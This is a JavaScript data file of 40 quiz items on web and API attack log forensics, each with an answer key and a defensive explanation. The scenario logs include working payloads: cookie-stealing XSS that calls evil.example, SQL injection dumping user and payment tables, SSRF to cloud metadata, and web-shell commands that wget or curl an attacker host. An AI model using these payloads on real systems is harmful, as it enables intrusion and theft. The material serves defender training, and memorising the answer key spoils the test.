// Domain 4 — Web & API Attacks (log forensics and defense)
// SQLi, XSS, SSRF, IDOR, command injection, Apache/Nginx log analysis.
const r = String.raw;

export const questionsD4 = [
  {
    id: 'd4-q01',
    domain: 4,
    difficulty: 'Easy',
    scenarioLog: '203.0.113.9 - - [14/Mar/2026:09:12:01 +0000] "GET /products.php?id=12%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 48211 "-" "sqlmap/1.8#stable"',
    question: 'What does this Apache access log entry show?',
    options: [
      'A reflected XSS attempt',
      'A directory traversal attempt',
      'A SQL injection attempt (URL-decoded: id=12\' OR \'1\'=\'1) made with an automated tool, and the large 200 response suggests it may have returned extra rows',
      'A normal product lookup',
    ],
    correctIndex: 2,
    explanation: 'URL-decoding gives a tautology injection that makes the WHERE clause always true. The sqlmap user agent identifies the tool (though it is trivially changed), and a 48 KB response compared with a normal product page hints that data was returned. Look for the same IP\'s subsequent requests to scope what was queried.',
  },
  {
    id: 'd4-q02',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`203.0.113.9 - - [14/Mar/2026:09:14:20] "GET /products.php?id=12%20AND%20SLEEP(5) HTTP/1.1" 200 812 "-" "Mozilla/5.0"
203.0.113.9 - - [14/Mar/2026:09:14:25] "GET /products.php?id=12%20AND%20SLEEP(0) HTTP/1.1" 200 812 "-" "Mozilla/5.0"
(nginx $request_time: 5.004 vs 0.003)`,
    question: 'Which SQL injection technique is being tested?',
    options: [
      'Time-based blind SQL injection: the attacker infers true/false from response delay because page content does not change',
      'UNION-based',
      'Error-based',
      'Second-order',
    ],
    correctIndex: 0,
    explanation: 'Identical response sizes but a 5-second difference in request time means the injected SLEEP executed. Time-based blind injection is slow but works when no output or errors are reflected. Logging $request_time in Nginx (or %D in Apache) makes this visible to defenders.',
  },
  {
    id: 'd4-q03',
    domain: 4,
    difficulty: 'Easy',
    scenarioLog: '',
    question: 'What is the most effective primary defense against SQL injection?',
    options: [
      'Blacklisting the word SELECT',
      'Hiding database errors only',
      'Parameterized queries (prepared statements) so user input is always treated as data, never as SQL code',
      'Using HTTPS',
    ],
    correctIndex: 2,
    explanation: 'Prepared statements bind input separately from the query structure, eliminating injection in that query. Blacklists are bypassed by encoding and case tricks, error suppression only hampers error-based techniques, and HTTPS protects transport, not the query. Add least-privilege DB accounts and a WAF as defense in depth.',
  },
  {
    id: 'd4-q04',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: '198.51.100.4 - - [14/Mar/2026:10:01:44] "GET /search?q=%3Cscript%3Efetch(%27https://evil.example/c?%27%2Bdocument.cookie)%3C/script%3E HTTP/1.1" 200 3311 "-" "Mozilla/5.0"',
    question: 'What is this request, and what is its likely goal?',
    options: [
      'SQL injection to dump tables',
      'SSRF to an internal host',
      'Reflected XSS: if the search term is echoed unencoded, the script runs in the victim\'s browser and sends their session cookie to an external server',
      'CSRF token theft via the Referer header',
    ],
    correctIndex: 2,
    explanation: 'Decoded, the parameter is a script tag that fetches an external URL with document.cookie appended. If reflected without output encoding, it executes in the context of the site. Defenses: context-aware output encoding, a strict Content-Security-Policy, and HttpOnly cookies so scripts cannot read session tokens.',
  },
  {
    id: 'd4-q05',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`POST /api/comments  {"postId":88,"body":"Nice post <img src=x onerror=this.src='https://evil.example/l?c='+document.cookie>"}
-- later, many users load /posts/88 --
nginx: 4,210 requests to evil.example/l?c=... originating from customer browsers (seen via CSP report-uri)`,
    question: 'Why is this more dangerous than reflected XSS?',
    options: [
      'It is not; they are equivalent',
      'It is stored (persistent) XSS: the payload is saved server-side and executes for every user who views the post, without needing each victim to click a crafted link',
      'It only affects the attacker',
      'It requires the victim to be an administrator',
    ],
    correctIndex: 1,
    explanation: 'Stored XSS persists in the application (comments, profiles) and hits every viewer, including administrators. CSP violation reports are a great detection source. Remediate by removing the stored payload, encoding output, sanitizing rich HTML with a vetted library, and rotating any sessions that may have been captured.',
  },
  {
    id: 'd4-q06',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`POST /api/v1/fetch-preview HTTP/1.1
Host: app.corp.com
{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-ec2-role"}
HTTP/1.1 200 OK
{"preview":"{\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\",\"Token\":\"...\"}"}`,
    question: 'What vulnerability is shown and what AWS control directly mitigates this exploitation path?',
    options: [
      'Server-side request forgery (SSRF) against the instance metadata service; enforcing IMDSv2 (session token required) blocks simple GET-based metadata theft',
      'IDOR; add authorization checks',
      'XSS; add CSP',
      'SQL injection; use prepared statements',
    ],
    correctIndex: 0,
    explanation: 'The server fetched a URL supplied by the user, including the link-local metadata endpoint, and returned temporary role credentials. IMDSv2 requires a PUT to obtain a session token with a custom header, which most SSRF primitives cannot do. Also validate and allowlist outbound destinations, block link-local and internal ranges, and keep roles least-privileged.',
  },
  {
    id: 'd4-q07',
    domain: 4,
    difficulty: 'Easy',
    scenarioLog: r`10.20.4.31 - alice [14/Mar/2026:11:00:01] "GET /api/v1/invoices/10441 HTTP/1.1" 200 1203
10.20.4.31 - alice [14/Mar/2026:11:00:02] "GET /api/v1/invoices/10442 HTTP/1.1" 200 1188
10.20.4.31 - alice [14/Mar/2026:11:00:02] "GET /api/v1/invoices/10443 HTTP/1.1" 200 1240
... (3,912 sequential IDs in 6 minutes, all 200)`,
    question: 'What vulnerability does this access pattern most likely reveal?',
    options: [
      'Cross-site request forgery',
      'Insecure Direct Object Reference / Broken Object Level Authorization: the API returns invoices belonging to other users when the ID is changed',
      'Clickjacking',
      'Open redirect',
    ],
    correctIndex: 1,
    explanation: 'A single authenticated user walking sequential object IDs and receiving 200 for all of them indicates the server is not checking ownership (OWASP API1: BOLA). Fix with server-side authorization on every object access; non-guessable IDs reduce enumeration but are not a fix by themselves. Rate limiting and anomaly alerts help detection.',
  },
  {
    id: 'd4-q08',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`203.0.113.9 - - [14/Mar/2026:12:20:10] "GET /tools/ping.php?host=8.8.8.8%3Bid HTTP/1.1" 200 412
Response body excerpt:
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data. ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
    question: 'What happened?',
    options: [
      'Reflected XSS',
      'OS command injection: the ";" separator appended "id", and the response shows the command executed as www-data',
      'SQL injection',
      'Local file inclusion',
    ],
    correctIndex: 1,
    explanation: '%3B decodes to ";", which ends the ping command and starts a new one. The uid=33(www-data) output confirms code execution as the web server user. Defenses: avoid shell calls with user input; use language APIs or argument arrays without a shell, plus strict allowlist validation (e.g., IP format).',
  },
  {
    id: 'd4-q09',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`203.0.113.9 - - "GET /download.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 2261
203.0.113.9 - - "GET /download.php?file=....//....//....//etc/shadow HTTP/1.1" 403 199`,
    question: 'What attack is being attempted, and what does the second line show?',
    options: [
      'SSRF; the second line shows success',
      'Directory (path) traversal; the first read /etc/passwd successfully, and the second used a filter-bypass variant but was blocked or denied',
      'Command injection',
      'XXE',
    ],
    correctIndex: 1,
    explanation: 'Encoded ../ sequences climb out of the intended directory; a 200 with a 2 KB response for /etc/passwd suggests success. The "....//" pattern targets naive filters that strip "../" once. A 403 means it was blocked. Fix by canonicalizing paths and enforcing that the result stays inside an allowlisted base directory.',
  },
  {
    id: 'd4-q10',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`$ awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -3
  18211 203.0.113.9
    944 10.20.4.31
    301 198.51.100.4
$ awk '$1=="203.0.113.9" {print $9}' access.log | sort | uniq -c
  16020 404
   2110 200
     81 500`,
    question: 'What does this log triage suggest about 203.0.113.9?',
    options: [
      'A normal heavy user',
      'Automated scanning/forced browsing (many 404s) with some hits and 500 errors worth reviewing, since server errors often accompany injection attempts',
      'A DDoS from many IPs',
      'A search engine crawler that should be allowlisted',
    ],
    correctIndex: 1,
    explanation: 'A very high request count dominated by 404s is typical of content discovery tools (dirb, gobuster, ffuf). The 200s show what was found and the 500s show inputs that broke the app, which are prime candidates for injection. Field $9 is the status code in the combined log format.',
  },
  {
    id: 'd4-q11',
    domain: 4,
    difficulty: 'Easy',
    scenarioLog: '',
    question: 'Which cookie attribute prevents JavaScript from reading a session cookie, reducing the impact of XSS?',
    options: [
      'Secure',
      'SameSite=None',
      'HttpOnly',
      'Path=/',
    ],
    correctIndex: 2,
    explanation: 'HttpOnly hides the cookie from document.cookie. Secure restricts it to HTTPS, SameSite controls cross-site sending (CSRF defense), and Path limits scope. HttpOnly does not stop XSS itself; the script can still act as the user within the page.',
  },
  {
    id: 'd4-q12',
    domain: 4,
    difficulty: 'Hard',
    scenarioLog: r`203.0.113.9 - - "GET /products.php?id=-1%20UNION%20SELECT%201,username,password,4%20FROM%20users--%20- HTTP/1.1" 200 5120
203.0.113.9 - - "GET /products.php?id=-1%20UNION%20SELECT%201,table_name,3,4%20FROM%20information_schema.tables--%20- HTTP/1.1" 200 9840`,
    question: 'In what order did the attacker most likely work, and what should IR assume?',
    options: [
      'The users table was queried first by chance; nothing to assume',
      'Only the schema was exposed',
      'UNION queries cannot return data',
      'Schema enumeration via information_schema normally comes first, then targeted extraction from users; assume credential data was exfiltrated, so force password resets and check the hashing scheme',
    ],
    correctIndex: 3,
    explanation: 'UNION-based injection appends a second SELECT whose results are rendered in the page. Attackers usually enumerate tables via information_schema, then dump interesting ones. Because users data was selected with a 200 response, treat credentials as exposed; log order may differ from reasoning order when requests are cached or parallel.',
  },
  {
    id: 'd4-q13',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`POST /api/v1/users/me HTTP/1.1
Authorization: Bearer eyJ...
{"displayName":"Bob","role":"admin","isVerified":true}
HTTP/1.1 200 OK  {"id":5512,"displayName":"Bob","role":"admin"}`,
    question: 'What API vulnerability does this show?',
    options: [
      'BOLA',
      'Mass assignment (Broken Object Property Level Authorization): the API bound client-supplied fields like role to the user object, allowing privilege escalation',
      'SSRF',
      'Rate limiting failure',
    ],
    correctIndex: 1,
    explanation: 'The client sent properties it should never control (role, isVerified) and the server accepted them. Fix by allowlisting writable fields per endpoint (DTOs) and enforcing authorization at the property level. This is OWASP API3:2023.',
  },
  {
    id: 'd4-q14',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<order><item>&xxe;</item></order>
Response: <error>Unknown item: web-prod-03</error>`,
    question: 'What vulnerability is demonstrated?',
    options: [
      'XSS',
      'CSRF',
      'XML External Entity (XXE) injection: the parser resolved an external entity and leaked a local file\'s contents in the error',
      'Insecure deserialization',
    ],
    correctIndex: 2,
    explanation: 'The DOCTYPE defines an external entity pointing to a local file, and the parser substituted its content (the hostname) into the response. XXE can also cause SSRF. Disable DTDs/external entity resolution in the XML parser configuration.',
  },
  {
    id: 'd4-q15',
    domain: 4,
    difficulty: 'Easy',
    scenarioLog: 'log_format main \'$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent" $request_time\';',
    question: 'Why is logging $request_time in Nginx useful for incident handlers?',
    options: [
      'It records the client time zone',
      'It is required for HTTPS',
      'It records the TLS version',
      'It records how long each request took, revealing time-based blind injection, slow exfiltration, or resource-exhaustion attacks',
    ],
    correctIndex: 3,
    explanation: '$request_time captures the processing duration in seconds with millisecond precision. Outliers reveal SLEEP-based injection and heavy queries. Similarly, Apache %D logs microseconds. Neither records time zones or TLS parameters ($ssl_protocol would).',
  },
  {
    id: 'd4-q16',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`192.0.2.50 - - "POST /uploads/avatar.php.jpg HTTP/1.1" 404
192.0.2.50 - - "POST /uploads/avatar.phtml HTTP/1.1" 200 22
192.0.2.50 - - "GET /uploads/avatar.phtml?c=whoami HTTP/1.1" 200 9`,
    question: 'What sequence of events do these logs suggest?',
    options: [
      'An unrestricted file upload was abused to place a PHP web shell with an alternative extension (.phtml) that the server executes, followed by command execution',
      'A user changed their avatar',
      'A failed SQL injection',
      'A CDN cache miss',
    ],
    correctIndex: 0,
    explanation: 'After .php.jpg failed, the attacker found that .phtml executes as PHP. A tiny 200 response to ?c=whoami is consistent with command output. Fix: allowlist extensions and content types, rename uploads, store them outside the web root or on a non-executing domain, and disable script execution in upload directories.',
  },
  {
    id: 'd4-q17',
    domain: 4,
    difficulty: 'Hard',
    scenarioLog: r`POST /api/v1/fetch-preview {"url":"http://127.0.0.1:6379/"}  -> 200 "-ERR wrong number of arguments"
POST /api/v1/fetch-preview {"url":"http://10.30.1.10:8500/v1/agent/self"} -> 200 {"Config":{"Datacenter":"dc1"...}}`,
    question: 'What is the attacker achieving with this SSRF?',
    options: [
      'Only reading public websites',
      'Internal network reconnaissance: reaching services bound to localhost (Redis on 6379) and internal APIs (Consul on 8500) that are not exposed externally',
      'Client-side XSS',
      'DNS rebinding of the victim browser',
    ],
    correctIndex: 1,
    explanation: 'SSRF turns the server into a proxy into trusted networks. Responses (even error strings) confirm which internal services exist. Unauthenticated internal services like Redis and Consul can lead to remote code execution. Defenses: allowlisted destinations, network egress controls from app servers, and authentication on internal services.',
  },
  {
    id: 'd4-q18',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`ModSecurity: Warning. Matched "Operator 'Rx' with parameter '(?i:union\s+select)'" against variable ARGS:id (Value: "-1 UNION/**/SELECT 1,2,3")
[id "942100"] [msg "SQL Injection Attack Detected via libinjection"] [severity "CRITICAL"] [hostname "shop.corp.com"] [uri "/products.php"]
Action: Intercepted (phase 2) Access denied with code 403`,
    question: 'What does this WAF log tell the responder?',
    options: [
      'The injection succeeded',
      'ModSecurity is in detection-only mode',
      'The OWASP CRS rule 942100 detected a SQL injection attempt (including comment obfuscation) and blocked it with 403; check whether other variants got through without 403',
      'The WAF crashed',
    ],
    correctIndex: 2,
    explanation: 'The Core Rule Set flagged a UNION SELECT with inline comment obfuscation and intercepted the request in phase 2 (request body/args). A block is good, but attackers iterate; correlate with access logs for the same IP returning 200s to find bypasses, and fix the underlying code.',
  },
  {
    id: 'd4-q19',
    domain: 4,
    difficulty: 'Easy',
    scenarioLog: '',
    question: 'What does Cross-Site Request Forgery (CSRF) exploit?',
    options: [
      'The browser automatically attaching a victim\'s session cookies to requests triggered by another site, causing unwanted state-changing actions',
      'Weak database passwords',
      'Unencrypted traffic',
      'Server-side file reads',
    ],
    correctIndex: 0,
    explanation: 'CSRF tricks a logged-in user\'s browser into submitting a request (e.g., change email). Defenses include anti-CSRF tokens, SameSite=Lax/Strict cookies, and checking Origin headers. It differs from XSS, which runs attacker script inside the trusted site.',
  },
  {
    id: 'd4-q20',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`$ grep -E "(%27|')|(--|%2D%2D)|(%3C|<)script|UNION|SLEEP\(|\.\./" access.log | awk '{print $1}' | sort | uniq -c | sort -rn
   311 203.0.113.9
    12 198.51.100.4
     1 10.20.4.31`,
    question: 'What is the purpose of this grep pipeline, and what is its main limitation?',
    options: [
      'It blocks attackers automatically',
      'It decodes all URL encoding',
      'It counts requests per IP matching common SQLi/XSS/traversal indicators to prioritize investigation; it misses POST bodies and heavily encoded variants that do not appear in access logs',
      'It proves which attacks succeeded',
    ],
    correctIndex: 2,
    explanation: 'Quick indicator greps help triage, but default access logs omit request bodies (POST/JSON), and double encoding or case tricks evade simple patterns. Success must be judged from status codes, response sizes, application logs and DB logs, not just matches.',
  },
  {
    id: 'd4-q21',
    domain: 4,
    difficulty: 'Hard',
    scenarioLog: r`GET /api/v1/orders?userId=5512 -> 200 [ ... ]
GET /api/v1/orders?userId=5512&userId=1 -> 200 [ orders for user 1 ]`,
    question: 'What technique bypassed the authorization check?',
    options: [
      'HTTP Parameter Pollution: the authorization layer checked the first userId while the backend used the last one',
      'SQL injection',
      'Session fixation',
      'Clickjacking',
    ],
    correctIndex: 0,
    explanation: 'Different components can parse duplicate parameters differently (first, last, or concatenated). If the gateway validates one value and the service uses another, authorization is bypassed. Normalize and reject duplicate parameters, and enforce object ownership in the service that uses the value.',
  },
  {
    id: 'd4-q22',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`$ find /var/www/html -name "*.php" -newer /var/www/html/index.php -mtime -3
/var/www/html/uploads/avatar.phtml
/var/www/html/wp-content/plugins/hello/cache.php
$ grep -l -E "eval\(|base64_decode\(|system\(|passthru\(|shell_exec\(" /var/www/html/wp-content/plugins/hello/cache.php
/var/www/html/wp-content/plugins/hello/cache.php`,
    question: 'What is the responder doing?',
    options: [
      'Patching WordPress',
      'Backing up the site',
      'Running a vulnerability scan',
      'Hunting for web shells: recently modified PHP files plus grep for dangerous functions commonly used by shells',
    ],
    correctIndex: 3,
    explanation: 'Web shells are often new or modified script files containing eval/base64_decode/system calls. File timestamps (which can be faked), functions, and file integrity monitoring baselines help locate them. Confirm with access logs showing requests to those files, then preserve copies before removal.',
  },
  {
    id: 'd4-q23',
    domain: 4,
    difficulty: 'Easy',
    scenarioLog: 'GET /login?next=https://evil.example/fake-login HTTP/1.1  -> 302 Location: https://evil.example/fake-login',
    question: 'What vulnerability is shown?',
    options: [
      'SQL injection',
      'SSRF',
      'IDOR',
      'Open redirect: the app redirects to any URL supplied in a parameter, which phishers abuse to lend credibility to malicious links',
    ],
    correctIndex: 3,
    explanation: 'The application trusts the next parameter and sends the browser to an external domain. Phishing links that start with the trusted domain become more convincing, and open redirects can help chain OAuth token theft. Restrict redirects to relative paths or an allowlist.',
  },
  {
    id: 'd4-q24',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: '2026-03-14 13:01:22 [error] 1880#0: *9921 FastCGI sent in stderr: "PHP Warning: mysqli_query(): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'\'\' at line 1 in /var/www/html/products.php on line 41"',
    question: 'Why is this Nginx error-log entry valuable during an investigation?',
    options: [
      'It shows the server is healthy',
      'It shows XSS',
      'Database syntax errors triggered by a single quote confirm the parameter reaches SQL unsanitized and identify the vulnerable file and line',
      'It indicates disk failure',
    ],
    correctIndex: 2,
    explanation: 'Error logs often capture what access logs cannot: the vulnerable code location and that input broke SQL syntax. Correlate the timestamp with access-log requests from the attacker. Also disable verbose errors to users, since they give attackers error-based injection feedback.',
  },
  {
    id: 'd4-q25',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI1NTEyIiwicm9sZSI6ImFkbWluIn0.
(decoded header: {"alg":"none","typ":"JWT"}  payload: {"sub":"5512","role":"admin"})
API response: 200 OK (admin endpoint)`,
    question: 'What flaw does this JWT reveal?',
    options: [
      'The token expired',
      'Base64 encoding is weak encryption',
      'The token uses RS256 correctly',
      'The API accepted an unsigned token with alg "none", letting the client forge claims like role=admin',
    ],
    correctIndex: 3,
    explanation: 'JWT libraries must reject alg "none" and enforce an expected algorithm. Here an empty signature was accepted, so the attacker forged admin claims. JWT payloads are only encoded, not encrypted. Fix by pinning algorithms, validating signatures, and checking issuer, audience and expiry.',
  },
  {
    id: 'd4-q26',
    domain: 4,
    difficulty: 'Hard',
    scenarioLog: r`198.51.100.4 - - "GET /profile?name=%3Csvg%2Fonload%3Dalert(1)%3E HTTP/1.1" 200
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'
Browser console: Refused to execute inline event handler because it violates the following Content Security Policy directive...`,
    question: 'What does this show about the defense in place?',
    options: [
      'CSP failed',
      'The attack succeeded because the response was 200',
      'The page reflected the payload (an output-encoding bug exists), but a nonce-based CSP blocked the inline handler from running',
      'CSP prevents the payload from being reflected',
    ],
    correctIndex: 2,
    explanation: 'CSP is defense in depth: it does not stop reflection but stops execution of unapproved inline script. The underlying vulnerability still needs fixing with proper output encoding. A 200 status says nothing about browser-side execution.',
  },
  {
    id: 'd4-q27',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`$ awk '$7 ~ /\/uploads\/avatar\.phtml/ {print $1, $4, $7}' access.log
192.0.2.50 [14/Mar/2026:14:02:10 /uploads/avatar.phtml?c=whoami
192.0.2.50 [14/Mar/2026:14:02:31 /uploads/avatar.phtml?c=cat+/etc/passwd
192.0.2.50 [14/Mar/2026:14:03:05 /uploads/avatar.phtml?c=wget+http://192.0.2.50/x.sh+-O+/tmp/x.sh
203.0.113.9 [14/Mar/2026:14:30:44 /uploads/avatar.phtml?c=id`,
    question: 'What is the most important scoping conclusion from this output?',
    options: [
      'The web shell was used for discovery and to download a second-stage script to /tmp, and a second IP (203.0.113.9) also used it, so scope includes both IPs and the downloaded file',
      'Only one attacker IP is involved',
      'No commands executed',
      'The attacker only read public files',
    ],
    correctIndex: 0,
    explanation: 'Field $7 is the request URI. Commands show the progression from discovery to tool download. A second IP using the same shell may be the same actor rotating infrastructure or a second actor. Investigate /tmp/x.sh, outbound connections, and any persistence it created.',
  },
  {
    id: 'd4-q28',
    domain: 4,
    difficulty: 'Easy',
    scenarioLog: '',
    question: 'Which HTTP response status code range indicates a server-side error that may signal an injection attempt broke application logic?',
    options: [
      '5xx',
      '3xx',
      '4xx',
      '2xx',
    ],
    correctIndex: 0,
    explanation: '5xx codes (500, 502, 503) mean the server failed to process the request, often due to unexpected input. 4xx are client errors like 403 or 404, 3xx are redirects, and 2xx are success.',
  },
  {
    id: 'd4-q29',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`POST /graphql
{"query":"{ __schema { types { name fields { name } } } }"}
200 OK (182 KB)`,
    question: 'What is the attacker doing, and what is the defensive recommendation?',
    options: [
      'Uploading a file',
      'Running a GraphQL introspection query to map the entire API schema; disable introspection in production and enforce query depth/cost limits',
      'Brute-forcing passwords',
      'Testing CSRF',
    ],
    correctIndex: 1,
    explanation: 'Introspection reveals every type, field and mutation, which helps attackers find sensitive operations. Production APIs commonly disable it and apply authorization per resolver, query depth/complexity limits, and rate limits to prevent abuse such as batching attacks.',
  },
  {
    id: 'd4-q30',
    domain: 4,
    difficulty: 'Hard',
    scenarioLog: r`POST /api/v1/report  {"template":"{{7*7}}"}  -> "Report: 49"
POST /api/v1/report  {"template":"{{config.items()}}"} -> "Report: dict_items([('SECRET_KEY', '...'), ...])"`,
    question: 'What vulnerability is this?',
    options: [
      'Reflected XSS',
      'Server-Side Template Injection (SSTI) in a Jinja2-style engine; arithmetic evaluated server-side and app configuration (including secrets) was exposed, which can escalate to code execution',
      'SQL injection',
      'Open redirect',
    ],
    correctIndex: 1,
    explanation: '{{7*7}} returning 49 is the classic SSTI probe. Leaking config shows access to server objects. Treat SECRET_KEY as compromised (rotate it, invalidate sessions) and never render user input as a template; pass it as data to a fixed template.',
  },
  {
    id: 'd4-q31',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`$ awk '{print $1, $9, $10}' access.log | awk '$1=="203.0.113.9" && $2==200 {sum+=$3} END {print sum/1024/1024 " MB"}'
412.7 MB`,
    question: 'Why is computing total response bytes for the attacker IP useful?',
    options: [
      'It measures server CPU',
      'It estimates how much data was returned to the attacker, which helps assess exfiltration scope for breach notification decisions',
      'It decrypts the traffic',
      'It shows client upload volume',
    ],
    correctIndex: 1,
    explanation: 'Field $10 in combined logs is response body size. Summing successful responses gives a lower bound on data sent to the attacker, valuable for impact assessment and notification. It does not show uploads (request bodies) or decrypt anything.',
  },
  {
    id: 'd4-q32',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`10.20.4.31 - alice "DELETE /api/v1/users/7781 HTTP/1.1" 204
(alice role: "viewer"; endpoint intended for admins only)`,
    question: 'What OWASP API category does this represent?',
    options: [
      'Broken Object Level Authorization',
      'Unrestricted resource consumption',
      'Broken Function Level Authorization: a low-privileged user invoked an administrative function',
      'Security misconfiguration only',
    ],
    correctIndex: 2,
    explanation: 'BFLA is about access to functions (admin endpoints/methods) rather than to specific objects. Enforce role checks on every endpoint and HTTP method, deny by default, and test non-GET methods. BOLA would be accessing another user\'s object through a function the user is allowed to call.',
  },
  {
    id: 'd4-q33',
    domain: 4,
    difficulty: 'Easy',
    scenarioLog: '203.0.113.9 - - "GET /index.php?page=http://192.0.2.50/shell.txt HTTP/1.1" 200',
    question: 'What attack is this?',
    options: [
      'Clickjacking',
      'CSRF',
      'IDOR',
      'Remote File Inclusion (RFI): attempting to make the PHP app include and execute code from an external URL',
    ],
    correctIndex: 3,
    explanation: 'A page parameter pointing to an external URL attempts RFI, which works if allow_url_include is enabled and the parameter is passed to include(). Local File Inclusion (LFI) uses local paths instead. Disable allow_url_include and use allowlisted page names.',
  },
  {
    id: 'd4-q34',
    domain: 4,
    difficulty: 'Hard',
    scenarioLog: r`203.0.113.9 - - "GET /tools/ping.php?host=8.8.8.8%0Acurl%20http://192.0.2.50/$(whoami) HTTP/1.1" 200
192.0.2.50 attacker web log: "GET /www-data HTTP/1.1" 404 from 198.51.100.200 (victim egress IP)`,
    question: 'What technique did the attacker use to confirm blind command injection?',
    options: [
      'Time delays',
      'UNION queries',
      'Error messages',
      'Out-of-band (OAST) exfiltration: a newline (%0A) started a new command whose output (the username) was sent to the attacker server in an HTTP request',
    ],
    correctIndex: 3,
    explanation: 'When output is not returned, attackers trigger outbound DNS/HTTP to a server they control, embedding results. %0A is a newline, another command separator. Egress filtering from web servers and alerting on unexpected outbound connections defeat this.',
  },
  {
    id: 'd4-q35',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`POST /api/v1/login  {"user":"admin","password":{"$ne":null}}
200 OK  {"token":"eyJ..."}`,
    question: 'What vulnerability allowed this login?',
    options: [
      'SQL injection',
      'JWT forgery',
      'XXE',
      'NoSQL injection: a MongoDB-style operator object ($ne: null) replaced the password string, making the condition true',
    ],
    correctIndex: 3,
    explanation: 'If the backend passes JSON input directly into a MongoDB query, an operator like $ne matches any non-null password. Validate types (password must be a string), use schema validation, and sanitize operator keys.',
  },
  {
    id: 'd4-q36',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: '',
    question: 'During web-app IR, why should responders preserve web server logs, application logs, and database logs promptly?',
    options: [
      'They are needed to rebuild the website',
      'Only database logs matter',
      'Logs are required for TLS',
      'Rotation and retention policies may delete them; together they show the request, the code path, and the actual queries/data touched, establishing scope',
    ],
    correctIndex: 3,
    explanation: 'Access logs show requests, application logs show errors and logic, and DB logs (general/slow query, audit) show what queries ran. Logrotate may compress and delete them within days. Collect, hash, and store copies early and centralize logs in a SIEM.',
  },
  {
    id: 'd4-q37',
    domain: 4,
    difficulty: 'Hard',
    scenarioLog: r`POST /api/v1/fetch-preview {"url":"http://0x7f000001:8080/admin"} -> 200
POST /api/v1/fetch-preview {"url":"http://attacker-rebind.example/"} -> 200 (resolved 1st: 93.184.216.34, 2nd: 127.0.0.1)`,
    question: 'Which SSRF filter bypasses are shown?',
    options: [
      'Alternative IP encoding (hex 0x7f000001 = 127.0.0.1) and DNS rebinding (validate-then-fetch resolves to a public IP first and loopback second)',
      'None; these are normal requests',
      'SQL injection via URL',
      'Open redirect only',
    ],
    correctIndex: 0,
    explanation: 'Blocklists checking for "127.0.0.1" miss hex, decimal and IPv6 forms. DNS rebinding exploits the gap between resolving for validation and resolving again for the fetch. Resolve once, validate the resolved IP against allowlists, connect to that IP, and block internal ranges at the network layer.',
  },
  {
    id: 'd4-q38',
    domain: 4,
    difficulty: 'Easy',
    scenarioLog: '',
    question: 'What is the difference between authentication and authorization in API security?',
    options: [
      'Authentication verifies who the caller is; authorization verifies what that caller is allowed to access or do',
      'They are the same',
      'Authorization happens before authentication',
      'Authentication only applies to admins',
    ],
    correctIndex: 0,
    explanation: 'Many API breaches (BOLA, BFLA) involve properly authenticated users who were not properly authorized. Both checks are needed on every request.',
  },
  {
    id: 'd4-q39',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`/var/log/mysql/general.log
2026-03-14T09:15:02  Query  SELECT * FROM products WHERE id = -1 UNION SELECT 1,username,password,4 FROM users-- -
2026-03-14T09:15:03  Query  SELECT * FROM products WHERE id = -1 UNION SELECT 1,card_number,exp,4 FROM payments-- -`,
    question: 'What does the database general log add that the web access log may not?',
    options: [
      'The attacker IP',
      'The browser version',
      'The TLS cipher',
      'Confirmation of the exact queries the database executed, including which sensitive tables (payments) were read, which is critical for impact assessment',
    ],
    correctIndex: 3,
    explanation: 'The general query log records the SQL actually executed. It confirms injection success and identifies exposed data types (here payment card data, which has PCI DSS notification implications). It is costly to keep enabled, so many teams rely on DB audit plugins or activity monitoring instead.',
  },
  {
    id: 'd4-q40',
    domain: 4,
    difficulty: 'Medium',
    scenarioLog: r`$ cat /var/log/nginx/access.log.1 | wc -l
0
$ ls -la /var/log/nginx/
-rw-r----- 1 www-data adm      0 Mar 14 14:40 access.log.1
-rw-r----- 1 www-data adm 812331 Mar 14 15:10 access.log`,
    question: 'What should the responder suspect, and where can they look for the missing data?',
    options: [
      'Log tampering by the attacker (who had www-data access via a web shell); recover from centralized logging/SIEM, load balancer or WAF logs, and backups',
      'Normal log rotation; nothing is missing',
      'Disk failure',
      'Nginx was not running',
    ],
    correctIndex: 0,
    explanation: 'A zero-byte rotated log modified shortly after web shell activity suggests the attacker truncated it. Because www-data owned the files, the web shell could alter them. Off-host logging (syslog forwarding, SIEM) and upstream logs (CDN, LB, WAF) preserve evidence. Restrict log file ownership so the web user cannot modify logs.',
  },
];
